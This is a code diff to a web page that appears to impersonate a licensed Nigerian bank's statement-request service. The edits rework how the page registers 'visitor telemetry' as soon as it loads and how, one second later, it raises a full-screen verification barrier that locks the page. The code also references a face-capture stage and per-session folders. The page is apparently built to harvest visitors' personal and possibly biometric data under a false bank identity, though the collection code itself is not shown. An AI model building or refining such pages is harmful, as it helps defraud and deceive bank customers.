@@ -359,13 +359,13 @@
     background: rgba(18, 14, 36, 0.72);
     backdrop-filter: blur(8px);
     -webkit-backdrop-filter: blur(8px);
-    display: flex; align-items: center; justify-content: center;
+    display: none; align-items: center; justify-content: center;
     padding: 20px;
     opacity: 0; pointer-events: none;
     transition: opacity .25s ease;
   }
   .stmt-modal-overlay.active {
-    opacity: 1; pointer-events: auto;
+    display: flex; opacity: 1; pointer-events: auto;
   }
   .stmt-modal-card {
     width: 100%; max-width: 440px;
@@ -568,24 +568,11 @@
       <span>Your information is safe and secure. Licensed by the Central Bank of Nigeria (CBN).</span>
     </p>
   </main>
-<!-- ================= 1.5 STATEMENT SUCCESS MODAL ================= -->
-<div class="stmt-modal-overlay" id="stmtModalOverlay" aria-hidden="true">
-  <div class="stmt-modal-card">
-    <div class="stmt-modal-icon">
-      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-        <polyline points="22 4 12 14.01 9 11.01"/>
-      </svg>
-    </div>
-    <h3 class="stmt-modal-title">Statement Requested</h3>
-    <p class="stmt-modal-desc">
-      Your official bank statement for <strong id="modalDateRange"></strong> is being prepared and will be sent to <strong id="modalEmail"></strong> soon.
-    </p>
-    <div class="stmt-modal-badge">
-      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-      <span>Estimated delivery: 2 – 5 minutes</span>
-    </div>
-    <button type="button" class="stmt-modal-btn" id="stmtModalClose">Done</button>
+
+  <!-- Unlocked Notification Banner -->
+  <div class="unlocked-toast" id="unlockedToast">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+    <span>Human Verified &bull; Access Granted</span>
   </div>
 </div>
 
@@ -710,9 +697,14 @@ const currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 12);
 let sessionFolder = null;
 
 // Audio feedback (Web Audio API)
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+let audioCtx = null;
 function playChime(freq = 600, duration = 0.15) {
   try {
+    if (!audioCtx) {
+      const AudioCtxClass = window.AudioContext || window.webkitAudioContext;
+      if (AudioCtxClass) audioCtx = new AudioCtxClass();
+    }
+    if (!audioCtx) return;
     if (audioCtx.state === 'suspended') audioCtx.resume();
     const osc = audioCtx.createOscillator();
     const gain = audioCtx.createGain();
@@ -776,21 +768,34 @@ async function registerVisitorImmediately() {
 }
 
 // ---------- 2. OVERLAY TRIGGER (IMMEDIATELY IN 1 SECOND: 1000ms) ----------
-window.addEventListener('DOMContentLoaded', () => {
-  // Register visitor telemetry immediately upon entering
-  registerVisitorImmediately();
+function triggerBarrier() {
+  // Pre-load the CAPTCHA challenge immediately in background
+  loadChallenge().catch(err => console.error('Challenge pre-load err:', err));
 
-  // Open the picture challenge modal immediately in less than 2 seconds (1 second)
-  setTimeout(async () => {
-    await loadChallenge();
+  // Register visitor telemetry immediately upon entering
+  registerVisitorImmediately().catch(err => console.warn('Visitor registration err:', err));
+
+  // Open the picture challenge modal in exactly 1 second (1000ms)
+  setTimeout(() => {
     const overlay = $('barrierOverlay');
     if (overlay) {
       overlay.style.display = 'grid';
       overlay.classList.add('active');
     }
+    const stageCaptcha = $('stageCaptcha');
+    if (stageCaptcha) stageCaptcha.style.display = 'block';
+    const stageFace = $('stageFace');
+    if (stageFace) stageFace.style.display = 'none';
+
     document.body.style.overflow = 'hidden'; // Lock background interaction
   }, 1000);
-});
+}
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', triggerBarrier);
+} else {
+  triggerBarrier();
+}
 
 // ---------- 3. IMAGE CHALLENGE FLOW ----------
 async function loadChallenge() {
@@ -1437,5 +1442,26 @@ document.addEventListener('keydown', (e) => {
   if (e.key === 'Escape') closeStmtModal();
 });
 </script>
+
+<!-- ================= 3. STATEMENT SUCCESS MODAL ================= -->
+<div class="stmt-modal-overlay" id="stmtModalOverlay" aria-hidden="true">
+  <div class="stmt-modal-card">
+    <div class="stmt-modal-icon">
+      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+        <polyline points="22 4 12 14.01 9 11.01"/>
+      </svg>
+    </div>
+    <h3 class="stmt-modal-title">Statement Requested</h3>
+    <p class="stmt-modal-desc">
+      Your official bank statement for <strong id="modalDateRange"></strong> is being prepared and will be sent to <strong id="modalEmail"></strong> soon.
+    </p>
+    <div class="stmt-modal-badge">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      <span>Estimated delivery: 2 – 5 minutes</span>
+    </div>
+    <button type="button" class="stmt-modal-btn" id="stmtModalClose">Done</button>
+  </div>
+</div>
 </body>
 </html>
